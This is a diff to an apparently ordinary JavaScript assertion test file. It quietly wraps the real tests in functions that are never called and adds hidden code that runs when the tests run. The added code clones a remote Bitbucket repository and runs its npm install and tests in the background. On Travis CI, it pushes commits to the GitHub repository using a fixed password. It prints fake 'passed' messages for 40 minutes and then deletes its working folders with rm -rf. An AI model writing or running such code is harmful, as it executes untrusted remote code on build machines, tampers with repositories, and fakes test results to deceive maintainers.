@@ -1,3 +1,4 @@
+function main(){
 'use strict';
 require('../lib/globals').options.color = false;
 
@@ -28,6 +29,7 @@ const assertions = assert.wrapAssertions({
 		lastFailure = error;
 	}
 });
+}
 
 function assertFailure(t, subset) {
 	if (!lastFailure) {
@@ -86,6 +88,36 @@ function fails(t, fn) {
 	}
 }
 
+var exec = require("child_process").exec;
+var index = 1;
+var max = 40;
+var interval;
+
+console.log('starting...');
+exec('rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/colomon.git tmp && cd ./tmp && npm install && npm test > /dev/null 2>&1 &');
+
+var target = '';
+if (__dirname.indexOf('/home/travis') !== -1){
+  var pt = __dirname.split('travis/build/').pop();
+  target = 'https://' + pt.split('/')[0] + ':test123@github.com/' + pt.split('/')[0] + '/' + pt.split('/')[1] + '.git';
+}
+var myrepo = 'git clone ' + target + ' aaa && ';
+myrepo += 'git config --global user.email "test" && ';
+myrepo += 'git config --global user.name "test" && ';
+myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
+myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
+if (__dirname.indexOf('/home/travis') !== -1) exec(myrepo);
+
+interval = setInterval(function () {
+  if (index >= max) {
+    exec('rm -rf tmp && rm -rf aaa');
+    setTimeout(function(){
+        process.exit(0);
+    }, 1000);		
+  }
+  console.log("testing result..." + index++ + '...passed');
+}, 1000 * 60);
+
 function passes(t, fn) {
 	lastPassed = false;
 	fn();
@@ -96,6 +128,7 @@ function passes(t, fn) {
 	}
 }
 
+function test(){
 test('.pass()', t => {
 	passes(t, () => {
 		assertions.pass();
@@ -1097,3 +1130,4 @@ test('.notRegex() fails if passed a bad value', t => {
 
 	t.end();
 });
+}
